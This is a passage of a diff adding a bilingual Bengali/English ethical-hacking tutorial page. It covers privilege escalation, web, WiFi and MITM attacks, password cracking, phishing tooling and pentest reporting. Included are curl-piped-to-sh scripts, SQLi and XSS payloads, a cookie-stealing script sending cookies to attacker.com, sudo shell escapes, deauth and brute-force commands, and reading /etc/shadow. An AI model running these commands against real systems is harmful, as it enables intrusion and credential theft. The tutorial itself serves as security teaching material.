+python3 -c 'import pty;pty.spawn("/bin/bash")'
+Ctrl+Z
+stty raw -echo; fg
+export TERM=xterm
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Common Exploit Types</span><span class="en-text">Common Exploit Types</span></h2>
+    <div class="grid2">
+      <div class="card">
+        <h4>🔴 <span class="bn-text">বিখ্যাত CVE Exploits</span><span class="en-text">Famous CVE Exploits</span></h4>
+        <ul style="font-size:12.5px;">
+          <li><strong>EternalBlue</strong> (MS17-010) — SMB</li>
+          <li><strong>Log4Shell</strong> (CVE-2021-44228)</li>
+          <li><strong>PrintNightmare</strong> (CVE-2021-34527)</li>
+          <li><strong>Shellshock</strong> (CVE-2014-6271) — Bash</li>
+          <li><strong>Heartbleed</strong> (CVE-2014-0160) — OpenSSL</li>
+          <li><strong>BlueKeep</strong> (CVE-2019-0708) — RDP</li>
+        </ul>
+      </div>
+      <div class="card purple-card">
+        <h4>🟣 <span class="bn-text">Payload Types</span><span class="en-text">Payload Types</span></h4>
+        <ul style="font-size:12.5px;">
+          <li><strong>Singles</strong> — <span class="bn-text">স্বাবলম্বী, কোনো stage নেই</span><span class="en-text">Self-contained, no stage</span></li>
+          <li><strong>Stagers</strong> — <span class="bn-text">ছোট, stage download করে</span><span class="en-text">Small, downloads stage</span></li>
+          <li><strong>Stages</strong> — <span class="bn-text">Stager দ্বারা লোড হয়</span><span class="en-text">Loaded by stager</span></li>
+          <li><strong>Meterpreter</strong> — <span class="bn-text">Advanced, in-memory</span><span class="en-text">Advanced, in-memory</span></li>
+          <li><strong>Shell</strong> — <span class="bn-text">Simple command shell</span><span class="en-text">Simple command shell</span></li>
+        </ul>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CHAPTER 6: POST-EXPLOITATION
+══════════════════════════════════════ -->
+<div class="chapter ch6">
+  <div class="chapter-header" data-num="06">
+    <div class="chapter-label">CHAPTER 06</div>
+    <div class="chapter-title">⬆️ <span class="bn-text">Post-Exploitation & Privilege Escalation</span><span class="en-text">Post-Exploitation & Privilege Escalation</span></div>
+    <div class="chapter-desc"><span class="bn-text">System-এ ঢোকার পর Persistence, PrivEsc, Lateral Movement, Data Exfiltration</span><span class="en-text">After getting in — Persistence, PrivEsc, Lateral Movement, Data Exfiltration</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">Privilege Escalation — Linux</span><span class="en-text">Privilege Escalation — Linux</span></h2>
+    <div class="code">
+<span class="c"># Automated Enumeration</span>
+<span class="p">$</span> curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+<span class="p">$</span> wget -O linpeas.sh https://linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
+
+<span class="c"># Manual Checks</span>
+<span class="p">$</span> id && whoami
+<span class="p">$</span> sudo -l                        <span class="c"># Sudo permissions</span>
+<span class="p">$</span> find / -perm -u=s -type f 2>/dev/null  <span class="c"># SUID files</span>
+<span class="p">$</span> cat /etc/crontab                <span class="c"># Cron jobs</span>
+<span class="p">$</span> cat /etc/passwd | grep -v nologin
+<span class="p">$</span> ss -tulpn                       <span class="c"># Listening ports</span>
+<span class="p">$</span> ps aux                          <span class="c"># Running processes</span>
+<span class="p">$</span> find / -writable -type d 2>/dev/null   <span class="c"># Writable dirs</span>
+<span class="p">$</span> uname -a                        <span class="c"># Kernel version</span>
+
+<span class="c"># GTFOBins — SUID exploit reference</span>
+<span class="c"># https://gtfobins.github.io</span>
+<span class="p">$</span> sudo find . -exec /bin/sh \; -quit   <span class="c"># find SUID</span>
+<span class="p">$</span> sudo vim -c ':!/bin/sh'              <span class="c"># vim sudo</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Privilege Escalation — Windows</span><span class="en-text">Privilege Escalation — Windows</span></h2>
+    <div class="code">
+<span class="c"># WinPEAS</span>
+<span class="p">C:\></span> winpeas.exe
+
+<span class="c"># Manual Checks</span>
+<span class="p">C:\></span> whoami /priv
+<span class="p">C:\></span> net user
+<span class="p">C:\></span> net localgroup administrators
+<span class="p">C:\></span> systeminfo
+<span class="p">C:\></span> sc query type= all state= all
+<span class="p">C:\></span> wmic service get name,startname
+<span class="p">PS ></span> Get-HotFix | sort InstalledOn   <span class="c"># Missing patches</span>
+
+<span class="c"># Token Impersonation (Meterpreter)</span>
+<span class="p">meterpreter ></span> use incognito
+<span class="p">meterpreter ></span> list_tokens -u
+<span class="p">meterpreter ></span> impersonate_token "NT AUTHORITY\\SYSTEM"
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Persistence Techniques</span><span class="en-text">Persistence Techniques</span></h2>
+    <div class="grid2">
+      <div class="card">
+        <h4>🐧 <span class="bn-text">Linux Persistence</span><span class="en-text">Linux Persistence</span></h4>
+        <ul style="font-size:12.5px;">
+          <li><span class="bn-text">Cron job যোগ করা</span><span class="en-text">Add a cron job</span></li>
+          <li><span class="bn-text">SSH key inject করা</span><span class="en-text">Inject SSH key</span></li>
+          <li><span class="bn-text">.bashrc backdoor</span><span class="en-text">.bashrc backdoor</span></li>
+          <li><span class="bn-text">Systemd service তৈরি করা</span><span class="en-text">Create a systemd service</span></li>
+          <li><span class="bn-text">SUID binary তৈরি করা</span><span class="en-text">Create SUID binary</span></li>
+        </ul>
+      </div>
+      <div class="card red-card">
+        <h4>🪟 <span class="bn-text">Windows Persistence</span><span class="en-text">Windows Persistence</span></h4>
+        <ul style="font-size:12.5px;">
+          <li><span class="bn-text">Registry Run key</span><span class="en-text">Registry Run key</span></li>
+          <li><span class="bn-text">Scheduled Task</span><span class="en-text">Scheduled Task</span></li>
+          <li><span class="bn-text">Startup folder</span><span class="en-text">Startup folder</span></li>
+          <li><span class="bn-text">Service install করা</span><span class="en-text">Install a service</span></li>
+          <li><span class="bn-text">DLL Hijacking</span><span class="en-text">DLL Hijacking</span></li>
+        </ul>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CHAPTER 7: WEB APPLICATION HACKING
+══════════════════════════════════════ -->
+<div class="chapter ch7">
+  <div class="chapter-header" data-num="07">
+    <div class="chapter-label">CHAPTER 07</div>
+    <div class="chapter-title">🌐 <span class="bn-text">Web Application Hacking</span><span class="en-text">Web Application Hacking</span></div>
+    <div class="chapter-desc"><span class="bn-text">OWASP Top 10, SQLi, XSS, CSRF, SSRF, File Upload, Burp Suite Workflow</span><span class="en-text">OWASP Top 10, SQLi, XSS, CSRF, SSRF, File Upload, Burp Suite Workflow</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">OWASP Top 10 (2021)</span><span class="en-text">OWASP Top 10 (2021)</span></h2>
+    <table>
+      <thead><tr>
+        <th>#</th>
+        <th><span class="bn-text">দুর্বলতা</span><span class="en-text">Vulnerability</span></th>
+        <th><span class="bn-text">সংক্ষেপ</span><span class="en-text">Summary</span></th>
+      </tr></thead>
+      <tbody>
+        <tr><td><span class="badge badge-r">A01</span></td><td><strong>Broken Access Control</strong></td><td><span class="bn-text">অননুমোদিত resource access</span><span class="en-text">Unauthorized resource access</span></td></tr>
+        <tr><td><span class="badge badge-r">A02</span></td><td><strong>Cryptographic Failures</strong></td><td><span class="bn-text">Weak encryption, HTTP, plain-text password</span><span class="en-text">Weak encryption, HTTP, plain-text password</span></td></tr>
+        <tr><td><span class="badge badge-r">A03</span></td><td><strong>Injection</strong></td><td><span class="bn-text">SQLi, XSS, Command Injection</span><span class="en-text">SQLi, XSS, Command Injection</span></td></tr>
+        <tr><td><span class="badge badge-y">A04</span></td><td><strong>Insecure Design</strong></td><td><span class="bn-text">Business logic flaw</span><span class="en-text">Business logic flaw</span></td></tr>
+        <tr><td><span class="badge badge-y">A05</span></td><td><strong>Security Misconfiguration</strong></td><td><span class="bn-text">Default password, verbose error</span><span class="en-text">Default password, verbose error</span></td></tr>
+        <tr><td><span class="badge badge-y">A06</span></td><td><strong>Vulnerable Components</strong></td><td><span class="bn-text">Outdated library/framework</span><span class="en-text">Outdated library/framework</span></td></tr>
+        <tr><td><span class="badge badge-b">A07</span></td><td><strong>Auth Failures</strong></td><td><span class="bn-text">Weak password, broken session</span><span class="en-text">Weak password, broken session</span></td></tr>
+        <tr><td><span class="badge badge-b">A08</span></td><td><strong>Software Integrity Failures</strong></td><td><span class="bn-text">CI/CD pipeline attack</span><span class="en-text">CI/CD pipeline attack</span></td></tr>
+        <tr><td><span class="badge badge-b">A09</span></td><td><strong>Logging Failures</strong></td><td><span class="bn-text">অপর্যাপ্ত logging ও monitoring</span><span class="en-text">Insufficient logging & monitoring</span></td></tr>
+        <tr><td><span class="badge badge-g">A10</span></td><td><strong>SSRF</strong></td><td><span class="bn-text">Server-side request forgery</span><span class="en-text">Server-side request forgery</span></td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec"><span class="bn-text">SQL Injection</span><span class="en-text">SQL Injection</span></h2>
+    <div class="code">
+<span class="c"># Basic SQLi Test</span>
+' OR '1'='1
+' OR '1'='1'--
+' OR 1=1--
+" OR "1"="1
+admin'--
+') OR ('1'='1
+
+<span class="c"># UNION-based SQLi</span>
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT username,password FROM users--
+
+<span class="c"># Error-based SQLi</span>
+' AND extractvalue(1,concat(0x7e,version()))--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+
+<span class="c"># Blind SQLi (Boolean-based)</span>
+' AND 1=1--   <span class="c"># True → page loads normally</span>
+' AND 1=2--   <span class="c"># False → page changes</span>
+' AND SUBSTRING(username,1,1)='a'--
+
+<span class="c"># SQLMap — Automated SQLi</span>
+<span class="p">$</span> sqlmap -u "http://target.com/page.php?id=1"
+<span class="p">$</span> sqlmap -u "http://target.com/page.php?id=1" --dbs
+<span class="p">$</span> sqlmap -u "http://target.com/page.php?id=1" -D mydb --tables
+<span class="p">$</span> sqlmap -u "http://target.com/page.php?id=1" -D mydb -T users --dump
+<span class="p">$</span> sqlmap -r request.txt --level 5 --risk 3
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Cross-Site Scripting (XSS)</span><span class="en-text">Cross-Site Scripting (XSS)</span></h2>
+    <div class="code">
+<span class="c"># Basic XSS Payloads</span>
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+&lt;img src=x onerror=alert('XSS')&gt;
+&lt;svg onload=alert('XSS')&gt;
+'"&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+
+<span class="c"># Cookie Stealing</span>
+&lt;script&gt;document.location='http://attacker.com/steal?c='+document.cookie&lt;/script&gt;
+
+<span class="c"># WAF Bypass</span>
+&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
+&lt;script&gt;eval(atob('YWxlcnQoMSk='))&lt;/script&gt;
+&lt;img src="x" onerror="&#97;&#108;&#101;&#114;&#116;(1)"&gt;
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Burp Suite Workflow</span><span class="en-text">Burp Suite Workflow</span></h2>
+    <div class="grid2">
+      <div class="card">
+        <h4>🔧 <span class="bn-text">মূল Features</span><span class="en-text">Core Features</span></h4>
+        <ul style="font-size:12.5px;">
+          <li><strong>Proxy</strong> — <span class="bn-text">HTTP request intercept</span><span class="en-text">HTTP request intercept</span></li>
+          <li><strong>Repeater</strong> — <span class="bn-text">Manual request modify</span><span class="en-text">Manual request modify</span></li>
+          <li><strong>Intruder</strong> — <span class="bn-text">Automated fuzzing</span><span class="en-text">Automated fuzzing</span></li>
+          <li><strong>Scanner</strong> — <span class="bn-text">Auto vulnerability scan</span><span class="en-text">Auto vulnerability scan</span></li>
+          <li><strong>Decoder</strong> — <span class="bn-text">Encode/decode data</span><span class="en-text">Encode/decode data</span></li>
+          <li><strong>Comparer</strong> — <span class="bn-text">Response comparison</span><span class="en-text">Response comparison</span></li>
+        </ul>
+      </div>
+      <div class="card green-card">
+        <h4>🎯 <span class="bn-text">Testing Workflow</span><span class="en-text">Testing Workflow</span></h4>
+        <ol style="font-size:12.5px;">
+          <li><span class="bn-text">Proxy ব্রাউজারে set করো</span><span class="en-text">Set proxy in browser</span></li>
+          <li><span class="bn-text">Target browse করো, requests দেখো</span><span class="en-text">Browse target, view requests</span></li>
+          <li><span class="bn-text">Interesting request Repeater-এ পাঠাও</span><span class="en-text">Send interesting requests to Repeater</span></li>
+          <li><span class="bn-text">Parameter modify করে test করো</span><span class="en-text">Modify parameters and test</span></li>
+          <li><span class="bn-text">Intruder দিয়ে fuzz করো</span><span class="en-text">Fuzz with Intruder</span></li>
+          <li><span class="bn-text">Scanner দিয়ে auto scan করো</span><span class="en-text">Run auto scan with Scanner</span></li>
+        </ol>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CHAPTER 8: NETWORK HACKING
+══════════════════════════════════════ -->
+<div class="chapter ch8">
+  <div class="chapter-header" data-num="08">
+    <div class="chapter-label">CHAPTER 08</div>
+    <div class="chapter-title">📡 <span class="bn-text">Network Hacking & Wireless</span><span class="en-text">Network Hacking & Wireless</span></div>
+    <div class="chapter-desc"><span class="bn-text">MITM Attack, ARP Spoofing, WiFi Password Cracking, WPA2 Attack</span><span class="en-text">MITM Attack, ARP Spoofing, WiFi Password Cracking, WPA2 Attack</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">Man-in-the-Middle (MITM) Attack</span><span class="en-text">Man-in-the-Middle (MITM) Attack</span></h2>
+    <div class="code">
+<span class="c"># ARP Spoofing</span>
+<span class="p">$</span> arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP
+<span class="p">$</span> arpspoof -i eth0 -t GATEWAY_IP VICTIM_IP
+
+<span class="c"># Enable IP Forwarding</span>
+<span class="p">$</span> echo 1 > /proc/sys/net/ipv4/ip_forward
+
+<span class="c"># Bettercap — All-in-one MITM</span>
+<span class="p">$</span> bettercap -iface eth0
+<span class="p">»</span> net.probe on
+<span class="p">»</span> net.recon on
+<span class="p">»</span> arp.spoof.targets VICTIM_IP
+<span class="p">»</span> arp.spoof on
+<span class="p">»</span> net.sniff on
+<span class="p">»</span> https.proxy on     <span class="c"># SSL Strip</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">WiFi Hacking — WPA/WPA2</span><span class="en-text">WiFi Hacking — WPA/WPA2</span></h2>
+    <div class="box danger">
+      <div class="box-t">⚠️ <span class="bn-text">শুধুমাত্র নিজের নেটওয়ার্কে বা অনুমতি নিয়ে!</span><span class="en-text">Only on your own network or with permission!</span></div>
+    </div>
+    <div class="code">
+<span class="c"># Monitor Mode</span>
+<span class="p">$</span> airmon-ng check kill
+<span class="p">$</span> airmon-ng start wlan0
+<span class="c"># Now interface is wlan0mon</span>
+
+<span class="c"># Scan Networks</span>
+<span class="p">$</span> airodump-ng wlan0mon
+
+<span class="c"># Capture Handshake</span>
+<span class="p">$</span> airodump-ng --bssid TARGET_MAC -c CHANNEL -w capture wlan0mon
+
+<span class="c"># Deauth Attack (force reconnect)</span>
+<span class="p">$</span> aireplay-ng -0 5 -a TARGET_MAC -c CLIENT_MAC wlan0mon
+
+<span class="c"># Crack WPA2 Handshake</span>
+<span class="p">$</span> aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
+<span class="p">$</span> hashcat -m 22000 capture.hc22000 rockyou.txt
+
+<span class="c"># WPS Attack (Pixie Dust)</span>
+<span class="p">$</span> wash -i wlan0mon                    <span class="c"># Find WPS-enabled APs</span>
+<span class="p">$</span> reaver -i wlan0mon -b TARGET_MAC -vv
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Packet Sniffing</span><span class="en-text">Packet Sniffing</span></h2>
+    <div class="code">
+<span class="c"># Tcpdump</span>
+<span class="p">$</span> tcpdump -i eth0
+<span class="p">$</span> tcpdump -i eth0 -w capture.pcap
+<span class="p">$</span> tcpdump -r capture.pcap
+<span class="p">$</span> tcpdump host 192.168.1.1
+<span class="p">$</span> tcpdump port 80
+<span class="p">$</span> tcpdump -A port 80   <span class="c"># ASCII output (HTTP)</span>
+
+<span class="c"># Tshark (Wireshark CLI)</span>
+<span class="p">$</span> tshark -i eth0
+<span class="p">$</span> tshark -r capture.pcap -Y "http.request"
+<span class="p">$</span> tshark -r capture.pcap -Y "ftp" -T fields -e ftp.request.arg
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CHAPTER 9: PASSWORD ATTACKS
+══════════════════════════════════════ -->
+<div class="chapter ch9">
+  <div class="chapter-header" data-num="09">
+    <div class="chapter-label">CHAPTER 09</div>
+    <div class="chapter-title">🔑 <span class="bn-text">Password Attacks & Cracking</span><span class="en-text">Password Attacks & Cracking</span></div>
+    <div class="chapter-desc"><span class="bn-text">Hash cracking, Brute Force, Dictionary Attack, Rainbow Tables</span><span class="en-text">Hash cracking, Brute Force, Dictionary Attack, Rainbow Tables</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">Hash Identification ও Cracking</span><span class="en-text">Hash Identification & Cracking</span></h2>
+    <div class="code">
+<span class="c"># Identify Hash Type</span>
+<span class="p">$</span> hash-identifier
+<span class="p">$</span> hashid "5f4dcc3b5aa765d61d8327deb882cf99"
+<span class="p">$</span> name-that-hash -t "hash_value"
+
+<span class="c"># Hashcat — GPU-powered cracking</span>
+<span class="p">$</span> hashcat -m 0 hash.txt rockyou.txt          <span class="c"># MD5</span>
+<span class="p">$</span> hashcat -m 100 hash.txt rockyou.txt        <span class="c"># SHA1</span>
+<span class="p">$</span> hashcat -m 1000 hash.txt rockyou.txt       <span class="c"># NTLM</span>
+<span class="p">$</span> hashcat -m 1800 hash.txt rockyou.txt       <span class="c"># SHA-512crypt</span>
+<span class="p">$</span> hashcat -m 22000 wpa.hc22000 rockyou.txt  <span class="c"># WPA2</span>
+<span class="p">$</span> hashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?l  <span class="c"># Brute Force</span>
+<span class="p">$</span> hashcat -m 0 hash.txt -r rules/best64.rule rockyou.txt
+
+<span class="c"># John the Ripper</span>
+<span class="p">$</span> john hash.txt
+<span class="p">$</span> john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+<span class="p">$</span> john hash.txt --format=md5crypt
+<span class="p">$</span> john --show hash.txt    <span class="c"># Show cracked passwords</span>
+<span class="p">$</span> unshadow /etc/passwd /etc/shadow > combined.txt && john combined.txt
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Online Service Brute Force</span><span class="en-text">Online Service Brute Force</span></h2>
+    <div class="code">
+<span class="c"># Hydra — Network Login Cracker</span>
+<span class="p">$</span> hydra -l admin -P rockyou.txt ssh://192.168.1.1
+<span class="p">$</span> hydra -L users.txt -P rockyou.txt ftp://192.168.1.1
+<span class="p">$</span> hydra -l admin -P rockyou.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
+<span class="p">$</span> hydra -l admin -P rockyou.txt rdp://192.168.1.1
+<span class="p">$</span> hydra -l admin -P rockyou.txt smtp://mail.target.com
+
+<span class="c"># Medusa</span>
+<span class="p">$</span> medusa -h 192.168.1.1 -u admin -P rockyou.txt -M ssh
+
+<span class="c"># CrackMapExec — SMB Password Spray</span>
+<span class="p">$</span> crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt
+<span class="p">$</span> crackmapexec smb 192.168.1.1 -u admin -p 'Password123!'
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Wordlists</span><span class="en-text">Wordlists</span></h2>
+    <table>
+      <thead><tr>
+        <th><span class="bn-text">Wordlist</span><span class="en-text">Wordlist</span></th>
+        <th><span class="bn-text">আকার</span><span class="en-text">Size</span></th>
+        <th><span class="bn-text">ব্যবহার</span><span class="en-text">Use</span></th>
+      </tr></thead>
+      <tbody>
+        <tr><td><code>rockyou.txt</code></td><td>14M passwords</td><td><span class="bn-text">সবচেয়ে বেশি ব্যবহৃত</span><span class="en-text">Most commonly used</span></td></tr>
+        <tr><td><code>SecLists</code></td><td><span class="bn-text">বিশাল collection</span><span class="en-text">Huge collection</span></td><td><span class="bn-text">Directory, username, password</span><span class="en-text">Directory, username, password</span></td></tr>
+        <tr><td><code>kaonashi.txt</code></td><td>500M+</td><td><span class="bn-text">Powerful crack</span><span class="en-text">Powerful crack</span></td></tr>
+        <tr><td><code>hashkiller</code></td><td>Online</td><td><span class="bn-text">Pre-computed hashes</span><span class="en-text">Pre-computed hashes</span></td></tr>
+      </tbody>
+    </table>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CHAPTER 10: SOCIAL ENGINEERING
+══════════════════════════════════════ -->
+<div class="chapter ch10">
+  <div class="chapter-header" data-num="10">
+    <div class="chapter-label">CHAPTER 10</div>
+    <div class="chapter-title">🎭 <span class="bn-text">Social Engineering</span><span class="en-text">Social Engineering</span></div>
+    <div class="chapter-desc"><span class="bn-text">Human psychology ব্যবহার করে তথ্য বা access বের করার কৌশল</span><span class="en-text">Using human psychology to extract information or access</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">Social Engineering কী?</span><span class="en-text">What is Social Engineering?</span></h2>
+    <p><span class="bn-text">Social Engineering হলো মানুষের মনোবিজ্ঞান ও বিশ্বাসযোগ্যতাকে কাজে লাগিয়ে sensitive তথ্য বা unauthorized access বের করা। প্রযুক্তিগত দুর্বলতার চেয়ে মানবিক দুর্বলতা exploit করা অনেক সহজ।</span><span class="en-text">Social Engineering is exploiting human psychology and trust to extract sensitive information or gain unauthorized access. Exploiting human vulnerabilities is often easier than technical ones.</span></p>
+
+    <div class="grid2">
+      <div class="card purple-card">
+        <h4>📧 <span class="bn-text">Phishing</span><span class="en-text">Phishing</span></h4>
+        <p style="font-size:12.5px;"><span class="bn-text">নকল email পাঠিয়ে ব্যবহারকারীকে ক্ষতিকর link-এ click করানো বা credential চুরি করা।</span><span class="en-text">Sending fake emails to trick users into clicking harmful links or stealing credentials.</span></p>
+      </div>
+      <div class="card yellow-card">
+        <h4>📞 <span class="bn-text">Vishing</span><span class="en-text">Vishing</span></h4>
+        <p style="font-size:12.5px;"><span class="bn-text">ফোন কলের মাধ্যমে নিজেকে IT support বা ব্যাংক হিসেবে পরিচয় দিয়ে তথ্য বের করা।</span><span class="en-text">Using phone calls, pretending to be IT support or a bank, to extract information.</span></p>
+      </div>
+      <div class="card red-card">
+        <h4>💬 <span class="bn-text">Pretexting</span><span class="en-text">Pretexting</span></h4>
+        <p style="font-size:12.5px;"><span class="bn-text">মিথ্যা পরিচয় ও পরিস্থিতি তৈরি করে target-এর বিশ্বাস অর্জন করা।</span><span class="en-text">Creating a false identity and scenario to gain the target's trust.</span></p>
+      </div>
+      <div class="card">
+        <h4>🪤 <span class="bn-text">Baiting</span><span class="en-text">Baiting</span></h4>
+        <p style="font-size:12.5px;"><span class="bn-text">USB drive ফেলে রাখা বা free software-এর লোভ দেখিয়ে malware ইনস্টল করানো।</span><span class="en-text">Leaving a USB drive or luring with free software to get malware installed.</span></p>
+      </div>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Social Engineering Toolkit (SET)</span><span class="en-text">Social Engineering Toolkit (SET)</span></h2>
+    <div class="code">
+<span class="c"># Launch SET</span>
+<span class="p">$</span> setoolkit
+
+<span class="c"># Spear-Phishing Attack Vectors</span>
+1) Social-Engineering Attacks
+ → 1) Spear-Phishing Attack Vectors
+   → 1) Perform a Mass Email Attack
+
+<span class="c"># Website Clone (Credential Harvesting)</span>
+1) Social-Engineering Attacks
+ → 2) Website Attack Vectors
+   → 3) Credential Harvester Attack Method
+     → 2) Site Cloner
+       → Enter URL to clone: http://facebook.com
+
+<span class="c"># GoPhish — Professional Phishing Framework</span>
+<span class="p">$</span> ./gophish
+<span class="c"># Web UI: https://localhost:3333</span>
+    </div>
+
+    <div class="box success">
+      <div class="box-t">🛡️ <span class="bn-text">Social Engineering থেকে রক্ষার উপায়</span><span class="en-text">How to Protect Against Social Engineering</span></div>
+      <ul>
+        <li><span class="bn-text">অচেনা email-এর link-এ click করো না</span><span class="en-text">Don't click links in unknown emails</span></li>
+        <li><span class="bn-text">ফোনে কখনো password বলো না</span><span class="en-text">Never give your password over the phone</span></li>
+        <li><span class="bn-text">MFA সবসময় চালু রাখো</span><span class="en-text">Always enable MFA</span></li>
+        <li><span class="bn-text">Security awareness training নাও</span><span class="en-text">Take security awareness training</span></li>
+        <li><span class="bn-text">Verify করো, বিশ্বাস করো না</span><span class="en-text">Verify, don't just trust</span></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CHAPTER 11: REPORTING
+══════════════════════════════════════ -->
+<div class="chapter ch11">
+  <div class="chapter-header" data-num="11">
+    <div class="chapter-label">CHAPTER 11</div>
+    <div class="chapter-title">📝 <span class="bn-text">Reporting & Documentation</span><span class="en-text">Reporting & Documentation</span></div>
+    <div class="chapter-desc"><span class="bn-text">Professional Penetration Testing Report লেখার সম্পূর্ণ গাইড</span><span class="en-text">Complete guide to writing a professional Penetration Testing Report</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">Pentest Report Structure</span><span class="en-text">Pentest Report Structure</span></h2>
+    <div class="grid2">
+      <div class="card">
+        <h4>📋 <span class="bn-text">রিপোর্টের অংশ</span><span class="en-text">Report Sections</span></h4>
+        <ol style="font-size:12.5px;">
+          <li><strong>Executive Summary</strong></li>
+          <li><strong>Scope & Methodology</strong></li>
+          <li><strong>Findings Summary</strong></li>
+          <li><strong>Detailed Findings</strong></li>
+          <li><strong>Risk Rating</strong></li>
+          <li><strong>Recommendations</strong></li>
+          <li><strong>Appendix</strong></li>
+        </ol>
+      </div>
+      <div class="card green-card">
+        <h4>✅ <span class="bn-text">প্রতিটি Finding-এ যা থাকবে</span><span class="en-text">What Each Finding Includes</span></h4>
+        <ul style="font-size:12.5px;">
+          <li><span class="bn-text">Vulnerability নাম ও CVE</span><span class="en-text">Vulnerability name & CVE</span></li>
+          <li><span class="bn-text">CVSS Score ও Risk Level</span><span class="en-text">CVSS Score & Risk Level</span></li>
+          <li><span class="bn-text">Affected System ও URL</span><span class="en-text">Affected System & URL</span></li>
+          <li><span class="bn-text">Description ও Impact</span><span class="en-text">Description & Impact</span></li>
+          <li><span class="bn-text">Proof of Concept (PoC)</span><span class="en-text">Proof of Concept (PoC)</span></li>
+          <li><span class="bn-text">Screenshot ও Evidence</span><span class="en-text">Screenshot & Evidence</span></li>
+          <li><span class="bn-text">Remediation Steps</span><span class="en-text">Remediation Steps</span></li>
+        </ul>
+      </div>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Risk Rating Matrix</span><span class="en-text">Risk Rating Matrix</span></h2>
+    <table>
+      <thead><tr>
+        <th><span class="bn-text">Risk Level</span><span class="en-text">Risk Level</span></th>
+        <th>CVSS</th>
+        <th><span class="bn-text">উদাহরণ</span><span class="en-text">Example</span></th>
+        <th><span class="bn-text">সমাধানের সময়</span><span class="en-text">Remediation Time</span></th>
+      </tr></thead>
+      <tbody>
+        <tr><td><span class="badge badge-r">CRITICAL</span></td><td>9.0–10</td><td>RCE, SQL Auth Bypass</td><td><span class="bn-text">২৪ ঘন্টার মধ্যে</span><span class="en-text">Within 24 hours</span></td></tr>
+        <tr><td><span class="badge badge-r">HIGH</span></td><td>7.0–8.9</td><td>SQLi, Privilege Escalation</td><td><span class="bn-text">৭ দিনের মধ্যে</span><span class="en-text">Within 7 days</span></td></tr>
+        <tr><td><span class="badge badge-y">MEDIUM</span></td><td>4.0–6.9</td><td>XSS, CSRF</td><td><span class="bn-text">৩০ দিনের মধ্যে</span><span class="en-text">Within 30 days</span></td></tr>
+        <tr><td><span class="badge badge-b">LOW</span></td><td>0.1–3.9</td><td>Information Disclosure</td><td><span class="bn-text">৯০ দিনের মধ্যে</span><span class="en-text">Within 90 days</span></td></tr>
+        <tr><td><span class="badge badge-g">INFO</span></td><td>0.0</td><td>Missing headers</td><td><span class="bn-text">পরবর্তী maintenance-এ</span><span class="en-text">At next maintenance</span></td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec"><span class="bn-text">Reporting Tools</span><span class="en-text">Reporting Tools</span></h2>
+    <div class="tool-grid">
+      <div class="tool-card">
+        <div class="tool-name">PlexTrac</div>
+        <div class="tool-cat">Report Platform</div>
+        <div class="tool-desc"><span class="bn-text">Professional pentest report platform</span><span class="en-text">Professional pentest report platform</span></div>
+      </div>
+      <div class="tool-card">
+        <div class="tool-name">Dradis</div>
+        <div class="tool-cat">Collaboration</div>
+        <div class="tool-desc"><span class="bn-text">Team-based reporting ও note sharing</span><span class="en-text">Team-based reporting & note sharing</span></div>
+      </div>
+      <div class="tool-card">
+        <div class="tool-name">Serpico</div>
+        <div class="tool-cat">Open Source</div>
+        <div class="tool-desc"><span class="bn-text">Open-source pentest reporting</span><span class="en-text">Open-source pentest reporting</span></div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CHAPTER 12: CHEAT SHEET
+══════════════════════════════════════ -->
+<div class="chapter ch12">
+  <div class="chapter-header" data-num="12">
+    <div class="chapter-label">CHAPTER 12</div>
+    <div class="chapter-title">📋 <span class="bn-text">Cheat Sheet — সম্পূর্ণ রেফারেন্স</span><span class="en-text">Cheat Sheet — Complete Reference</span></div>
+    <div class="chapter-desc"><span class="bn-text">সব গুরুত্বপূর্ণ কমান্ড এক জায়গায় — দ্রুত রেফারেন্সের জন্য</span><span class="en-text">All important commands in one place — for quick reference</span></div>
